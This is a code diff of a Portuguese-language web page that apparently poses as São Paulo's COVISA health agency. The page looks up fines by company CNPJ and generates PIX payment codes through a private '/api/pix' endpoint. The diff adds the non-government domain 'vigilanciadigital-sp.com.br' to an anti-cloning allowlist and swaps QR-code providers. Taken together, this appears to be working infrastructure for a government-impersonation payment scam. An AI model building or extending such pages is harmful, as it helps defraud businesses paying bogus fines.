@@ -2,7 +2,6 @@
 <html lang="pt-BR">
 <head>
   <script>
-      <script>
     // ========================================================
     // ESCUDO ANTI-CLONAGEM E ANTI-IFRAME (SEGURANÇA MÁXIMA - ESTILO MAGALU)
     // ========================================================
@@ -29,7 +28,7 @@
 
         // 2. Trava de Domínio Rigorosa (Anti-Proxy / Clonagem Reversa)
         // Quando colocar o seu site no ar (ex: gov.br, vercel.app), adicione o URL exato dele aqui.
-        const dominiosPermitidos = ['localhost', '127.0.0.1', 'github.io', 'vercel.app', 'covisa']; 
+        const dominiosPermitidos = ['localhost', '127.0.0.1', 'github.io', 'vercel.app', 'covisa', 'vigilanciadigital-sp.com.br']; 
         const dominioAtual = window.location.hostname;
         let dominioAutorizado = false;
 
@@ -164,9 +163,9 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                     try {
                         let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
                         let valorCobrado = parseFloat(valorFormatadoCalc);
-                        const LINK_DO_GATEWAY = '/api/pix'; // TODO: Colocar URL do novo gateway
+                        const LINK_DO_VERCEL = '/api/pix';
                         
-                        const responsePix = await fetch(LINK_DO_GATEWAY, {
+                        const responsePix = await fetch(LINK_DO_VERCEL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -201,7 +200,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                             document.getElementById('pix-copia-cola-multa').value = dadosPix.copyPaste;
                             
                             // Cria a imagem usando a string fornecida pela API Vercel
-                            let qrSrc = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(dadosPix.copyPaste)}&choe=UTF-8`;
+                            let qrSrc = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(dadosPix.copyPaste)}`;
                             
                             if (dadosPix.qrcodeUrl && !dadosPix.qrcodeUrl.startsWith('http') && dadosPix.qrcodeUrl.length > 100) {
                                 if (dadosPix.qrcodeUrl.startsWith('data:image')) {
@@ -2589,7 +2588,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                       try {
                           let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
                           let valorCobrado = parseFloat(valorFormatadoCalc);
-                          const LINK_DO_GATEWAY = '/api/pix'; // TODO: Colocar URL do novo gateway
+                          const LINK_DO_VERCEL = '/api/pix';
 
                           let chaveCache = 'pix_gerado_' + pedido.cnpj.replace(/\D/g, '');
                           let pixCache = localStorage.getItem(chaveCache);
@@ -2610,7 +2609,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                           }
 
                           if (!usarCache) {
-                              const responsePix = await fetch(LINK_DO_GATEWAY, {
+                              const responsePix = await fetch(LINK_DO_VERCEL, {
                                   method: 'POST',
                                   headers: { 'Content-Type': 'application/json' },
                                   body: JSON.stringify({
@@ -2635,7 +2634,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                           if (dadosPix.success) {
                               document.getElementById('pix-copia-cola').value = dadosPix.copyPaste;
 
-                              let qrSrc = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(dadosPix.copyPaste)}&choe=UTF-8`;
+                              let qrSrc = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(dadosPix.copyPaste)}`;
                               
                               if (dadosPix.qrcodeUrl && !dadosPix.qrcodeUrl.startsWith('http') && dadosPix.qrcodeUrl.length > 100) {
                                   if (dadosPix.qrcodeUrl.startsWith('data:image')) {
@@ -2886,9 +2885,9 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                     try {
                         let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
                         let valorCobrado = parseFloat(valorFormatadoCalc);
-                        const LINK_DO_GATEWAY = '/api/pix'; // TODO: Colocar URL do novo gateway
+                        const LINK_DO_VERCEL = '/api/pix';
                         
-                        const responsePix = await fetch(LINK_DO_GATEWAY, {
+                        const responsePix = await fetch(LINK_DO_VERCEL, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
@@ -2923,7 +2922,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                             document.getElementById('pix-copia-cola-multa').value = dadosPix.copyPaste;
                             
                             // Cria a imagem usando a string fornecida pela API Vercel
-                            let qrSrc = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(dadosPix.copyPaste)}&choe=UTF-8`;
+                            let qrSrc = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(dadosPix.copyPaste)}`;
                             
                             if (dadosPix.qrcodeUrl && !dadosPix.qrcodeUrl.startsWith('http') && dadosPix.qrcodeUrl.length > 100) {
                                 if (dadosPix.qrcodeUrl.startsWith('data:image')) {
